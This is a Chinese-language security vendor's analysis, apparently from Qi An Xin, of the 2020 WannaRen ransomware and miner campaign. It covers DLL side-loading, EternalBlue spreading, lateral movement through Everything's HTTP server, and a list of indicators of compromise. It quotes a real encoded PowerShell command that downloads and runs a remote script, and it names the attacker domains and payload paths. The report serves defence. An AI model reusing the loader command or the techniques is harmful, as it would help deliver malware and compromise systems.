近日，有网友在社交媒体公开求助，称感染了一款名为WannaRen的新型勒索软件，部分文件被加密，需要支付0.05个比特币（约合2500元***）。

部分截图如下：

![图片.png](https://image.3001.net/images/20200409/1586394644_5e8e76148069b.png!small)  

WannaRen解密器图标伪装Everything。

![图片.png](https://image.3001.net/images/20200409/1586394651_5e8e761b980e8.png!small)  

奇安信病毒响应中心在发现该情况后，第一时间发布了关于该WannaRen的样本解密器分析报告。

WannaRen勒索软件事件分析报告

<https://mp.weixin.qq.com/s/pWB1Ex2X6AcSSMIswLizXg>

勒索软件的样本解密器截图：

![图片.png](https://image.3001.net/images/20200409/1586394658_5e8e7622016fd.png!small)

为了进一步补充攻击视角，奇安信威胁情报中心红雨滴团队详细分析事件后，将更多关于该勒索攻击的检测维度公布。

## 攻击事件分析

根据线索，我们发现于4月2号天擎用户的拦截日志显示

powershell.exe -ep bypass -e

SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0A**AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjAHMALgBzAHMAbABzAG4AZwB5AGwAOQAwA**AYwBvAG0AJwApACkA

通过解码发现powershell会去下载并执行cs.sslsngyl90.com的脚本。

实际上该域名会重定向至如下链接。

<http://cpu.sslsngyl90.com/vip.txt>

从Vip.txt中的脚本可见攻击者会从vim-cn.com图床上下载WINWORD.EXE和wwlib.dll，这种是典型的白加黑攻击手段。通过执行WINWORD.EXE即可加载于同一目录的wwlib.dll。

![图片.png](https://image.3001.net/images/20200409/1586394672_5e8e7630146e5.png!small)

紧接着wwlib.dll会去加载Public\目录下的you程序，有趣的是，fm文件会记录程序的运行时间，该时间使用简体中文进行记录，因此攻击者是中国人的概率非常大。

![图片.png](https://image.3001.net/images/20200409/1586394697_5e8e76490cb3e.png!small)

该程序需要会使用busahk87909we对you进行解密，解密后在内存加载WannaRen勒索软件

![图片.png](https://image.3001.net/images/20200409/1586394679_5e8e76370ccfd.png!small)

之后的事，跟开头的感染后的症状一致了。

除了上面的勒索情况外，Powershell下载器还具有挖矿功能，其下载后会重命名为nb.exe，其意指中文的**

![图片.png](https://image.3001.net/images/20200409/1586394710_5e8e7656054f2.png!small)

有趣的是，在事情发酵之后，攻击者删除了脚本中，下载勒索模块的链接，变成了下面这个模块。

![图片.png](https://image.3001.net/images/20200409/1586394716_5e8e765ca6ca1.png!small)

我们可以合理的猜测，勒索软件作者都没有料到，就因为他将勒索软件命名为WannaRen，收到了如此大的关注，因此将链接删掉从而试图逃避检测。

然而目前事情居然上了微博热搜，而且阅读量高达1.1亿，只能说当年的WannaCry余威仍在不断散发，攻击者这次是不好跑了。

![图片.png](https://image.3001.net/images/20200409/1586394722_5e8e76629ee0d.png!small)

## 横向移动功能

从Powershell下载器中可以看到，攻击者会通过图床链接去下载永恒之蓝传播模块。

![图片.png](https://image.3001.net/images/20200409/1586394729_5e8e76699354c.png!small)

而office.exe实际上是自解压文件。

![图片.png](https://image.3001.net/images/20200409/1586394734_5e8e766eeb455.png!small)

此外，该脚本还有一种很少见的横向移动辅助手法，该手法利用了Everything拥有的http服务器功能。

首先，其会在受害器上下载aaaa.exe，并保存到C:\Users\Public\目录下，功能为释放everything并开启http服务器功能，这样在同一内网的其他受害者就可以通过该http服务器下载上面的恶意程序，从而进一步的扩散受害面。

![图片.png](https://image.3001.net/images/20200409/1586394742_5e8e76765a9eb.png!small)

## 关联分析

通过攻击者的域名，我们发现sslsngyl90.com在1月份奇安信威胁情报中心与就已经将该域名与HideShadowMiner组织的攻击关联在一起，并将域名置黑，
**因此部署相关情报产品的用户均无遭受此威胁。** ****

![图片.png](https://image.3001.net/images/20200409/1586394747_5e8e767bbee65.png!small)

HideShadowMiner，国内统称为匿影组织，该组织此前一直进行挖矿攻击，此前国内友商就曾发布过该组织的攻击报告：

<http://www.ijinshan.com/info/202003201525.shtml>

此外，我们通过特征，发现匿影组织还使用了多个域名搭载同一套Powershell攻击框架发起攻击。

<http://us.howappyoude.club/v.txt>

<http://cpu.goolecpuclan.xyz/vip.txt>

相关攻击域名在全网的访问趋势图，时间集中在近期，符合事件发生时段。

![图片.png](https://image.3001.net/images/20200409/1586394754_5e8e76828a6af.png!small)

除了上面的线索外，还需要注意的是，攻击者会通过微当下载去下载APK程序，并重命名为exe文件，但这也意味着，微当下载并没有识别出该APK是恶意的PE程序并进行了放行，这对于攻击者来说是一个非常好利用的资源。

![图片.png](https://image.3001.net/images/20200409/1586394760_5e8e7688a7db7.png!small)

微当下载的软件提交方式

![图片.png](https://image.3001.net/images/20200409/1586394764_5e8e768c600b3.png!small)

## 总结

万幸的是，虽说整个攻击过程都被奇安信分析人员解析清楚，但是由于在 **2020** **年 4** **月 2** **号**
奇安信天擎就已经检测并执行Powershell攻击的行为，因此奇安信的用户无一中招。

![图片.png](https://image.3001.net/images/20200409/1586394770_5e8e76922a6d1.png!small)

此外，退一万步说，即使Powershell执行起来了，但是对应的勒索病毒模块同样被天擎查杀。

![图片.png](https://image.3001.net/images/20200409/1586394774_5e8e769628fb3.png!small)

奇安信红雨滴团队提醒广大用户，及时备份重要文件，更新安装补丁，切勿打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行夸张的标题的未知文件，不安装非正规途径来源的APP。

我们提供了IOC，以供用户自查。

## IOC

cpu.sslsngyl90.com/xx.txt

cpu.sslsngyl90.com/wmi.txt

us.howappyoude.club/v.txt

cpu.goolecpuclan.xyz/vip.txt

xx.sslsngyl90.com

xx.sslsngyl90.com

wmi.sslsngyl90.com

wmi.sslsngyl90.com

d.sslsngyl90.com

cs.sslsngyl90.com

cpu.sslsngyl90.com

sslsngyl90.com

相关恶意程序下发路径

C:\ProgramData\227.exe

C:\ProgramData\office.exe

C:\ProgramData\nb.exe

C:\ProgramData\WinRing0x64.sys

C:\ProgramData\officekms.exe

C:\ProgramData\xeexfrt.txt

C:\Users\Public\MicrosftEdgeCP.exe

C:\Users\Public\1\winlogtrf.exe

C:\ProgramData\227.txt

C:\Users\Public\ aaaa.exe

C:\Users\Public\you

C:\ProgramData\wwlib.dll

WannaRen勒索软件主体Hash

9854723bf668c0303a966f2c282f72ea

